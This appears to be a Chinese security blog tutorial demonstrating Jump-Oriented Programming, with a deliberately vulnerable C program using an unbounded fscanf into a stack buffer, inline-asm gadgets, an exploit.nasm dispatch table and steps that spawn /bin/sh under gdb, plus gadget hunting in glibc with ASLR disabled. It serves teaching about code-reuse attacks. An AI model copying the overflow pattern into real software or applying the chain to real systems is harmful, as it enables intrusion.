> 原文链接: https://www.anquanke.com//post/id/151571 


# JOP代码复用攻击


                                阅读量   
                                **262547**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0136748aa7ff37a33b.jpg)](https://p2.ssl.qhimg.com/t0136748aa7ff37a33b.jpg)

最近，我在研究代码重用攻击与防御，在此过程中发现对于rop（return-Oriented Programming）的介绍有许多，但jop(Jump-Oriented Programming)却少有提及。即使有，多数也与rop混杂在一起。因此，我决定基于论文[Jump-Oriented Programming: A New Class of Code-Reuse Attack](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)完成一次演示。



## 一．什么是jop?

jop，全称Jump-Oriented Programming，中文译为面向跳转编程，是代码重用攻击方式的一种。在2011年，北卡罗来纳州立大学的Tyler Bletsch等人首次提出这一概念。其实际上是在代码空间中寻找被称为gadget的一连串目标指令，且其以jmp结尾。下图展示了jop原理。

[![](https://p2.ssl.qhimg.com/t01adfa571be725c91c.png)](https://p2.ssl.qhimg.com/t01adfa571be725c91c.png)

 

Dispatcher是形如下列形式的代码块
<td valign="top" width="568">pcßf(pc);jmp pc;</td>

jmp pc;

pc可以是任意地址或寄存器，用其作为跳转目标。f(pc)表示对pc进行的操作，以下是一个例子。
<td valign="top" width="568">inc eax;jmp eax;</td>

jmp eax;

比如说首次跳转到了dispatch table的第一项，将会在执行一些指令后通过结尾处的jmp跳转回Dispatcher处，此时执行inc eax，eax值已改变，再次跳转就可以调到其他地方执行相应指令。而这些gadget的图灵完备性已被证明，也就是说，我们能通过这些gadget达到几乎所有目的。那么，让我们开始吧！



## 二．通过jop执行/bin/sh（简单版）

系统环境
<td valign="top" width="587">主机OS      :     4.4.0-116-generic内核Ubuntu 16.04  i686 CPU           :      Intel(R) Core(TM) i5-3337U CPU @ 1.80GHz</td>

首先，我们来完成一个最简版本的jop攻击。

漏洞代码vul.c

```
#include &lt;stdlib.h&gt;  
#include &lt;stdio.h&gt;  
#include &lt;string.h&gt;  
#include &lt;fcntl.h&gt;  
#include &lt;sys/stat.h&gt;  
#include &lt;sys/mman.h&gt;  
#include &lt;unistd.h&gt;  
  
char* executable="/bin//sh";  
char* null="";  
FILE * fd;  
  
void attack_payload () `{`  
asm(".intel_syntax noprefix");  
//dispatcher  
asm("add ebp,edi; jmp [ebp-0x39];");  
  
//initializer  
asm("popa; jmp [ebx-0x3e];");  
  
//g00  
asm("popa; cmc; jmp [edx];");  
//g01  
asm("inc eax; cmc; jmp [edx];");  
//g02  
asm("mov [ebx-0x17bc0000], ah; stc; jmp [edx];");  
//g03  
asm("inc ebx; stc; jmp [edx];");  
//g07  
asm("popa; call dword ptr [ecx];");  
//g08  
asm("xchg ecx, eax; fdiv st, st(3); jmp [esi-0xf];");  
//g09  
asm("mov eax, [esi+0xc]; mov [esp], eax; call [esi+0x4];");  
//g0a  
asm("int 0x80");  
  
asm(".att_syntax noprefix");  
`}`  
  
void overflow() `{`  
  char buf[256];  
  fscanf(fd,"%[^n]",buf);  
  return;  
`}`  
  
int main(int argc, char** argv) `{`  
  char* filename = "exploit";  
  if(argc&gt;1) filename = argv[1];  
  fd=fopen(filename, "r");  
  overflow();  
`}`
```

在此版本的演示中，所有gadget均由内联汇编直接写入，无需在代码空间中寻找。

攻击最终要执行execve(“/bin/sh”，argv，envp)，函数原型为
<td style="width: 440.5pt; border: solid windowtext 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt;" valign="top" width="587">**int** execve(**const** **char** *filename,**char** * **const** argv[],**char** * **const** envp[]);  </td>

若要通过int  80执行它，需要有四个寄存器的参与：eax寄存器传递系统调用号0xb，ebx寄存器传递“/bin/sh”字符串的地址，ecx寄存器传递参数argv，edx寄存器传递环境变量envp。为此需要合理设置eax、ebx、ecx、edx等4个寄存器的值。具体步骤如下 
<td style="width: 426.1pt; border: solid windowtext 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt;" valign="top" width="568"><!-- [if supportFields]&gt;--> = 1 * GB3 ①<!-- [if supportFields]&gt;-->popa ; jmp  *-0x3e(%ebx)缓冲区溢出会在相应位置设置好数据，popa将会将栈顶所有数据弹出到相应寄存器，栈帧指向buff字符串，然后跳转至攻击起始处，即第二步。  = 2 * GB3 ②<!-- [if supportFields]&gt;-->add  %edi,%ebp; jmp  *-0x39(%ebp)这时攻击开始，此处ebp寄存器即对应图4.2.5中的PC，edi寄存器已在上一步被设置为偏移量-4，跳转到相应步骤，第一次将会跳到第三步。 = 3 * GB3 ③<!-- [if supportFields]&gt;-->popa ; …… ; jmp *(%edx)由于execve()的调用号为0x0000000b，包含’’，无法直接通过缓冲区溢出写入eax寄存器，所以将会分阶段写入。这一步中，将会用popa设置相应寄存器，为写入做准备，准备好一个中间变量，置为0xEEEEEE0b。将eax寄存器置为-1，并通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第四步。  = 4 * GB3 ④<!-- [if supportFields]&gt;-->inc %eax ; ……; jmp *(%edx)这一步将eax寄存器加一，为后面的写入做准备，通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第五步。 = 5 * GB3 ⑤<!-- [if supportFields]&gt;-->mov %ah,-0x17bc0000(%ebx) ;…… ; jmp *(%edx)此时ah=0x00，mov操作将把中间变量中的第5,6位0xEE置为0x00, 通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第六步。 <!-- [if supportFields]&gt;--> = 6 * GB3 ⑥<!-- [if supportFields]&gt;--> inc %ebx ; …… ; jmp *(%edx)ebx寄存器加一，为下一步设置中间变量做准备， 通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第七步。 <!-- [if supportFields]&gt;--> = 7 * GB3 ⑦<!-- [if supportFields]&gt;--> mov %ah,-0x17bc0000(%ebx) ;…… ; jmp *(%edx)ah=0x00，mov操作将把中间变量中的第3,4位0xEE置为0x00, 通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第八步。 <!-- [if supportFields]&gt;--> = 8 * GB3 ⑧<!-- [if supportFields]&gt;--> inc %ebx ; …… ; jmp *(%edx)ebx寄存器加一，为下一步设置中间变量做准备， 通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第九步。 <!-- [if supportFields]&gt;--> = 9 * GB3 ⑨<!-- [if supportFields]&gt;-->mov %ah,-0x17bc0000(%ebx) ;…… ; jmp *(%edx)ah=0x00，mov操作将把中间变量中的第1,2位0xEE置为0x00, 中间变量此时为0x0000000b,通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第十步。 = 10 * GB3 ⑩<!-- [if supportFields]&gt;-->popa ;…… ; jmp *(%ecx)成功设置中间变量后，再次设置相应寄存器，通过ecx寄存器跳转回第二步，执行之后步骤。  ⑪xchg  %eax,%ecx ;……; jmp  *-0xf(%esi)由于上一步需要ecx寄存器做跳转，故交换eax,ecx, 通过esi寄存器跳转回第二步，执行之后步骤。 ⑫这个步骤无间接跳转，将会把eax寄存器设置为中间变量值0xb，然后传递系统调用号，此时ebx寄存器指向“/bin/sh”，陷入80中断，执行/bin/sh</td>

栈帧指向buff字符串，然后跳转至攻击起始处，即第二步。

 = 2 * GB3 ②<!-- [if supportFields]&gt;-->add  %edi,%ebp; jmp  *-0x39(%ebp)

 

由于execve()的调用号为0x0000000b，包含’’，无法直接通过缓冲区溢出写入eax寄存器，所以将会分阶段写入。这一步中，将会用popa设置相应寄存器，为写入做准备，准备好一个中间变量，置为0xEEEEEE0b。将eax寄存器置为-1，并通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第四步。

 = 4 * GB3 ④<!-- [if supportFields]&gt;-->inc %eax ; ……; jmp *(%edx)

 

此时ah=0x00，mov操作将把中间变量中的第5,6位0xEE置为0x00, 通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第六步。

<!-- [if supportFields]&gt;--> = 6 * GB3 ⑥<!-- [if supportFields]&gt;--> inc %ebx ; …… ; jmp *(%edx)

 

ah=0x00，mov操作将把中间变量中的第3,4位0xEE置为0x00, 通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第八步。

<!-- [if supportFields]&gt;--> = 8 * GB3 ⑧<!-- [if supportFields]&gt;--> inc %ebx ; …… ; jmp *(%edx)

 

ah=0x00，mov操作将把中间变量中的第1,2位0xEE置为0x00, 中间变量此时为0x0000000b,通过edx寄存器跳转回第二步，第二步再以新的地址执行一次跳转，跳转到第十步。

= 10 * GB3 ⑩<!-- [if supportFields]&gt;-->popa ;…… ; jmp *(%ecx)

 

由于上一步需要ecx寄存器做跳转，故交换eax,ecx, 通过esi寄存器跳转回第二步，执行之后步骤。

⑫这个步骤无间接跳转，将会把eax寄存器设置为中间变量值0xb，然后传递系统调用号，此时ebx寄存器指向“/bin/sh”，陷入80中断，执行/bin/sh

exploit是由exploit.nasm文件生成的二进制文件，用作缓冲区溢出的输入。

[![](https://p0.ssl.qhimg.com/t01f24eca7072eb0d3e.png)](https://p0.ssl.qhimg.com/t01f24eca7072eb0d3e.png)

需要注意的只是它的前21行。

将vul.c编译为可执行文件
<td valign="top" width="568">gcc -g -fno-stack-protector -o vul vul.c</td>

用gdb查看各地址[![](https://p1.ssl.qhimg.com/t0127ba57bbc08feae9.png)](https://p1.ssl.qhimg.com/t0127ba57bbc08feae9.png)

填入exploit.nasm
<td style="width: 426.1pt; border: solid windowtext 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt;" valign="top" width="568">start:; Constants:base:                    equ 0xbfffef40           ; Address where this buffer is loaded under gdbdispatcher:          equ 0x08048449        ; Address of the dispatcher gadgetinitializer             equ dispatcher+5       ; Address of initializer gadgetto_executable:           equ 0x08048590        ; Points to the string “/bin/sh”to_null:         equ 0x08048599        ; Points to a null dword (0x00000000)buffer_length:            equ 0x100           ; Target program’s buffer size. ; The dispatch table is below (in reverse order)g0a: dd dispatcher+52                    ; int 0x80g09: dd dispatcher+43                   ; mov eax, [esi+0xc]          ; mov [esp], eax  ; call [esi+0x4]g08: dd dispatcher+37                   ; xchg ecx, eax          ; fdiv st, st(3)      ; jmp [esi-0xf]g07: dd dispatcher+33                   ; popa                         ; cmc                   ; jmp [ecx]g06: dd dispatcher+19                   ; mov [ebx-0x17bc0000], ah   ; stc               ; jmp [edx]g05: dd dispatcher+28                   ; inc ebx               ; fdivr st(1), st     ; jmp [edx]g04: dd dispatcher+19                   ; mov [ebx-0x17bc0000], ah   ; stc               ; jmp [edx]g03: dd dispatcher+28                   ; inc ebx               ; fdivr st(1), st     ; jmp [edx]g02: dd dispatcher+19                   ; mov [ebx-0x17bc0000], ah   ; stc               ; jmp [edx]g01: dd dispatcher+14                  ; inc eax               ; fdivr st(1), st     ; jmp [edx]g00: dd dispatcher+9                     ; popa                         ; fdivr st(1), st     ; jmp [edx]</td>

; Constants:

dispatcher:          equ 0x08048449        ; Address of the dispatcher gadget

to_executable:           equ 0x08048590        ; Points to the string “/bin/sh”

buffer_length:            equ 0x100           ; Target program’s buffer size.

; The dispatch table is below (in reverse order)

g09: dd dispatcher+43                   ; mov eax, [esi+0xc]          ; mov [esp], eax  ; call [esi+0x4]

g07: dd dispatcher+33                   ; popa                         ; cmc                   ; jmp [ecx]

g05: dd dispatcher+28                   ; inc ebx               ; fdivr st(1), st     ; jmp [edx]

g03: dd dispatcher+28                   ; inc ebx               ; fdivr st(1), st     ; jmp [edx]

g01: dd dispatcher+14                  ; inc eax               ; fdivr st(1), st     ; jmp [edx]

生成exploit[![](https://p0.ssl.qhimg.com/t014144799235499df1.png)](https://p0.ssl.qhimg.com/t014144799235499df1.png)

gdb下运行vul，执行/bin/sh[![](https://p1.ssl.qhimg.com/t01aa37853244f164aa.png)](https://p1.ssl.qhimg.com/t01aa37853244f164aa.png)

 

## 三．进阶

以上例子可以作为jop的一个例子，但实际上不能真实反映其特点。jop 的gadget并不直接存在于当前存在的指令中，而是依赖于对于opcode的另一种解读，如glibc-2.19中，有如下源码：[![](https://p5.ssl.qhimg.com/t0114cccafcfe512779.png)](https://p5.ssl.qhimg.com/t0114cccafcfe512779.png)

但使用ROPgadget对其进行gadget提取结果如下：[![](https://p1.ssl.qhimg.com/t010f65d07c5aba85e9.png)](https://p1.ssl.qhimg.com/t010f65d07c5aba85e9.png)

实际从0x683c7处开始将其解读为
<td valign="top" width="568">D5 FF            aad 0xffFF                  jmp ecx</td>

因此，我们需要去掉内联汇编，直接在代码空间中寻找gadget。

为此，我们需要使用ROPgadget工具。
<td valign="top" width="568">sudo pip install ropgadget</td>

我们将在libc中寻找gadget。查看其路径并进行查找。[![](https://p5.ssl.qhimg.com/t01c0a28dcf42d98a07.png)](https://p5.ssl.qhimg.com/t01c0a28dcf42d98a07.png)

在gadget.txt中就能查找到各gadget的相对地址。

[![](https://p1.ssl.qhimg.com/t010b6f564535952523.png)](https://p1.ssl.qhimg.com/t010b6f564535952523.png)

[![](https://p4.ssl.qhimg.com/t0177b5b3db4db67ea5.png)](https://p4.ssl.qhimg.com/t0177b5b3db4db67ea5.png)

[![](https://p3.ssl.qhimg.com/t018086b23a536ce466.png)](https://p3.ssl.qhimg.com/t018086b23a536ce466.png)

[![](https://p5.ssl.qhimg.com/t0137f01d3170435e28.png)](https://p5.ssl.qhimg.com/t0137f01d3170435e28.png)

[![](https://p5.ssl.qhimg.com/t01a556f25ce6cd634e.png)](https://p5.ssl.qhimg.com/t01a556f25ce6cd634e.png)

 为了计算其绝对地址，我们关闭地址随机化。[![](https://p5.ssl.qhimg.com/t01f6050397d4bcd0f2.png)](https://p5.ssl.qhimg.com/t01f6050397d4bcd0f2.png)

显然有system_addr – system_libc = xx_addr – xx_libc

反汇编查看可得system_libc[![](https://p5.ssl.qhimg.com/t01f2a71bea2b4e3874.png)](https://p5.ssl.qhimg.com/t01f2a71bea2b4e3874.png)

gdb可打印system地址[![](https://p4.ssl.qhimg.com/t0100ae2e4582682e44.png)](https://p4.ssl.qhimg.com/t0100ae2e4582682e44.png)

则可计算各绝对地址，填入exploit.nasm.[![](https://p1.ssl.qhimg.com/t01af52cde22a9403ae.png)](https://p1.ssl.qhimg.com/t01af52cde22a9403ae.png)

再次生成exploit,gdb下运行。 [![](https://p2.ssl.qhimg.com/t01a055c552f8e5a77e.png)](https://p2.ssl.qhimg.com/t01a055c552f8e5a77e.png)

至此，演示以全部完成。

源码请自行下载[https://pan.baidu.com/s/15CssPnl_Rv0VYCru3htF2Q](https://pan.baidu.com/s/15CssPnl_Rv0VYCru3htF2Q)

审核人：yiwang   编辑：边边
